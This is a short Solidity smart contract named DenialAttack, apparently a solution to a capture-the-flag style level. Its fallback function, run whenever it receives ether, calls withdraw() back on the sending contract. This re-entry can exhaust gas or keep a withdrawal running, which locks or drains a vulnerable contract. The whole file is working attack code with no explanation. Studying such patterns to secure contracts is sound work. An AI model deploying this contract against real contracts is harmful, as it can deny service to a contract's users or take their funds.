// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DenialAttack {
  fallback() external payable {
    msg.sender.call(abi.encodeWithSignature("withdraw()"));
  }
}